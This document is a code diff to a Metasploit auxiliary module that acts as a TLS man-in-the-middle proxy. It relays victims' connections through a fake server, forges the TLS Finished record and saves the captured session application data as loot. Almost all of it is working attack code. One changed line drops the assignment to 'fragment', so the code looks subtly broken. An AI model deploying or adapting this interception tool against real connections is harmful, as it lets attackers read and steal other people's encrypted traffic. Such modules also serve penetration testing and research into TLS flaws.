@@ -60,6 +60,21 @@ class Metasploit3 < Msf::Auxiliary
       ], self.class)
   end
 
+  def cleanup
+    super
+    return unless @proxy
+
+    begin
+      @proxy.deref if @proxy.kind_of?(Rex::Service)
+      if @proxy.kind_of?(Rex::Socket)
+        @proxy.close
+        @proxy.stop
+      end
+      @proxy = nil
+    rescue ::Exception
+    end
+  end
+
   def prf(secret, label, seed)
     if secret.empty?
       s1 = s2 = ''
@@ -93,21 +108,27 @@ class Metasploit3 < Msf::Auxiliary
     local_port = datastore['SRVPORT']
     port = datastore['PORT']
 
-    proxy = TCPServer.new(local_host, local_port)
-    print_status('Listening on %s:%d' % [proxy.addr[2], proxy.addr[1]])
+    #proxy = TCPServer.new(local_host, local_port)
+    @proxy = Rex::Socket::TcpServer.create(
+      'LocalHost' => local_host,
+      'LocalPort' => local_port,
+      'Context'   => {
+        'Msf' => framework,
+        'MsfExploit' => self
+      }
+    )
+    print_status('Listening on %s:%d' % [local_host, local_port])
 
     thread_num = 0
 
     loop do
-      framework.threads.spawn("Thread #{thread_num += 1}", false, proxy.accept) do |client|
-      #loop do
+      framework.threads.spawn("Thread #{thread_num += 1}", false, @proxy.accept) do |client|
+        add_socket(client)
         finished_sent = false
         handshake_messages = ''
         application_data = ''
 
-        #client = proxy.accept
-
-        print_status('Accepted connection from %s:%d' % [client.addr[2], client.addr[1]])
+        print_status('Accepted connection from %s:%d' % [client.peerhost, client.peerport])
 
         fake_server = Rex::Socket::Tcp.create(
           'PeerHost' => fake_host,
@@ -119,6 +140,7 @@ class Metasploit3 < Msf::Auxiliary
               'Msf'        => framework,
               'MsfExploit' => self
             })
+        add_socket(fake_server)
 
         print_status('Connected to %s:%d' % [fake_host, fake_port])
 
@@ -130,6 +152,7 @@ class Metasploit3 < Msf::Auxiliary
               'Msf'        => framework,
               'MsfExploit' => self
             })
+        add_socket(server)
 
         print_status('Connected to %s:%d' % [host, port])
 
@@ -143,12 +166,12 @@ class Metasploit3 < Msf::Auxiliary
                 # The fake_server (i.e., server) is an SSL socket; Read
                 # application data directly.
                 header = ''
-                fragment = r.readpartial(4096)
+                r.get_once(4096)
 
               else
-                header = r.read(5)
+                header = r.get_once(5)
                 raise EOFError if header.nil?
-                fragment = r.read(header[3, 2].unpack('n')[0])
+                fragment = r.get_once(header[3, 2].unpack('n')[0])
               end
 
               print_status('%d bytes received' % [header.length + fragment.length])
@@ -167,8 +190,7 @@ class Metasploit3 < Msf::Auxiliary
                 finished = "\x14#{[verify_data.length].pack('N')[1, 3]}#{verify_data}"
                 record = header[0, 3] + [finished.length].pack('n') + finished
 
-                count = client.write(record)
-                client.flush
+                count = client.put(record)
                 print_status('%d bytes sent' % [count])
 
                 finished_sent = true
@@ -194,13 +216,12 @@ class Metasploit3 < Msf::Auxiliary
               when client
                 if finished_sent
                   # The server (i.e., fake_server) is an SSL socket
-                  count = server.write(fragment)
+                  count = server.put(fragment)
                 else
                   # The server isn't an SSL socket
-                  count = server.write(header + fragment)
+                  count = server.put(header + fragment)
                 end
 
-                server.flush
                 print_status('%d bytes sent' % [count])
 
               when fake_server
@@ -208,14 +229,12 @@ class Metasploit3 < Msf::Auxiliary
                 # with the same version used in the handshake.
                 header = "\x17\x03#{version}" + [fragment.length].pack('n')
                 record = header + fragment
-                count = client.write(record)
-                client.flush
+                count = client.put(record)
                 print_status('%d bytes sent' % [count])
 
               when server
                 record = header + fragment
-                count = client.write(record)
-                client.flush
+                count = client.put(record)
                 print_status('%d bytes sent' % [count])
               end
             end
@@ -225,7 +244,7 @@ class Metasploit3 < Msf::Auxiliary
           path = store_loot(
             'tls.application_data',
             'application/octet-stream',
-            client.addr[2],
+            client.peerhost,
             application_data,
             'application_data',
             'TLS session application data'
@@ -245,8 +264,6 @@ class Metasploit3 < Msf::Auxiliary
         server.close
       end
     end
-
-    proxy.close
   end
 
 end
